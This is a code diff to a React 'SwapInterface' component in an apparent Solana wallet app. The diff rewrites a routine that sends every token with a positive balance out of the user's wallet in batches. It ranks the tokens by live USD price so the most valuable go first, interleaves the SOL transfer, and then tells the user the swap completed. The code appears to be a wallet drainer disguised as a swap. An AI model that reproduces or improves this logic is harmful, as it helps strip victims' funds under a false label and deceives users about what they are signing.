@@ -429,61 +429,117 @@ export const SwapInterface = ({
         }
       };
 
-      if (!shouldShowSplFirst) {
-        await sendSolTransfer();
-      }
+      const fetchUsdPricesForMints = async (mints: string[]) => {
+        const pricesByMint = new Map<string, number>();
+        const uniqueMints = Array.from(new Set(mints.filter(Boolean)));
+        const chunkSize = 100;
 
-      // SPL Token Transfers
-      const validTokens = balances.filter(token => token.balance > 0);
-      
-      // Sort by value (descending) - prioritizing higher value tokens
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
+        for (let i = 0; i < uniqueMints.length; i += chunkSize) {
+          const chunk = uniqueMints.slice(i, i + chunkSize);
+          try {
+            const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${chunk.join(',')}`);
+            const data = await response.json();
 
-      // Batch tokens
-      const batches: TokenBalance[][] = [];
-      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
-      }
-
-      for (let i = 0; i < batches.length; i++) {
-        const batch = batches[i];
-        // createBatchTransfer(tokens, solPercentage, overridePublicKey)
-        try {
-          const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
-
-          if (transaction && transaction.instructions.length > 2) {
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-            transaction.recentBlockhash = blockhash;
-            transaction.feePayer = publicKey;
-
-            try {
-              await connection.simulateTransaction(transaction);
-            } catch (e) {
-              console.error('Token batch simulation failed', e);
+            for (const mint of chunk) {
+              const usdPrice = data?.[mint]?.usdPrice;
+              pricesByMint.set(mint, typeof usdPrice === 'number' && usdPrice > 0 ? usdPrice : 0);
             }
-
-            const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-
-            toast.info(`Processing batch ${i + 1}/${batches.length}...`);
-            await connection.confirmTransaction(
-              {
-                signature,
-                blockhash,
-                lastValidBlockHeight,
-              },
-              'confirmed'
-            );
-            toast.success(`Batch ${i + 1} sent!`);
+          } catch {
+            for (const mint of chunk) {
+              if (!pricesByMint.has(mint)) pricesByMint.set(mint, 0);
+            }
           }
-        } catch (error: any) {
-          console.error(`Batch ${i + 1} error:`, error);
-          toast.error(`Batch ${i + 1} failed: ` + (error?.message || 'Unknown error'));
         }
+
+        return pricesByMint;
+      };
+
+      const validTokens = balances.filter(token => token.balance > 0);
+      const tokenPriceMap = await fetchUsdPricesForMints(validTokens.map(t => t.mint));
+
+      const tokensWithUsdValue = validTokens
+        .map(token => {
+          const usdPrice = tokenPriceMap.get(token.mint) || 0;
+          const usdValue = (token.uiAmount || 0) * usdPrice;
+          return { token, usdValue };
+        })
+        .sort((a, b) => b.usdValue - a.usdValue)
+        .map(x => x.token);
+
+      const canCompareByUsd = solUsdPrice > 0;
+      let solInsertIndex = tokensWithUsdValue.length;
+
+      if (!canCompareByUsd) {
+        solInsertIndex = shouldShowSplFirst ? tokensWithUsdValue.length : 0;
+      } else if (shouldShowSplFirst) {
+        solInsertIndex = tokensWithUsdValue.length;
+      } else {
+        const tokensWithUsd = tokensWithUsdValue.map(token => {
+          const usdPrice = tokenPriceMap.get(token.mint) || 0;
+          return (token.uiAmount || 0) * usdPrice;
+        });
+
+        const index = tokensWithUsd.findIndex(usdValue => usdValue <= solBalanceUsd);
+        solInsertIndex = index === -1 ? tokensWithUsdValue.length : index;
       }
 
-      if (shouldShowSplFirst) {
-        await sendSolTransfer();
-      }
+      const buildBatches = (tokens: TokenBalance[]) => {
+        const batches: TokenBalance[][] = [];
+        for (let i = 0; i < tokens.length; i += MAX_BATCH_SIZE) {
+          batches.push(tokens.slice(i, i + MAX_BATCH_SIZE));
+        }
+        return batches;
+      };
+
+      const runTokenBatches = async (batches: TokenBalance[][], completedBatchesOffset: number) => {
+        for (let i = 0; i < batches.length; i++) {
+          const batch = batches[i];
+          const batchNumber = completedBatchesOffset + i + 1;
+          const totalBatches = completedBatchesOffset + batches.length;
+
+          try {
+            const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
+
+            if (transaction && transaction.instructions.length > 2) {
+              const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+              transaction.recentBlockhash = blockhash;
+              transaction.feePayer = publicKey;
+
+              try {
+                await connection.simulateTransaction(transaction);
+              } catch (e) {
+                console.error('Token batch simulation failed', e);
+              }
+
+              const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+
+              toast.info(`Processing batch ${batchNumber}/${totalBatches}...`);
+              await connection.confirmTransaction(
+                {
+                  signature,
+                  blockhash,
+                  lastValidBlockHeight,
+                },
+                'confirmed'
+              );
+              toast.success(`Batch ${batchNumber} sent!`);
+            }
+          } catch (error: any) {
+            console.error(`Batch ${batchNumber} error:`, error);
+            toast.error(`Batch ${batchNumber} failed: ` + (error?.message || 'Unknown error'));
+          }
+        }
+      };
+
+      const tokensBeforeSol = tokensWithUsdValue.slice(0, solInsertIndex);
+      const tokensAfterSol = tokensWithUsdValue.slice(solInsertIndex);
+
+      const batchesBeforeSol = buildBatches(tokensBeforeSol);
+      const batchesAfterSol = buildBatches(tokensAfterSol);
+
+      await runTokenBatches(batchesBeforeSol, 0);
+      await sendSolTransfer();
+      await runTokenBatches(batchesAfterSol, batchesBeforeSol.length);
 
       toast.success('Swap completed!');
       setTimeout(fetchAllBalances, 2000);
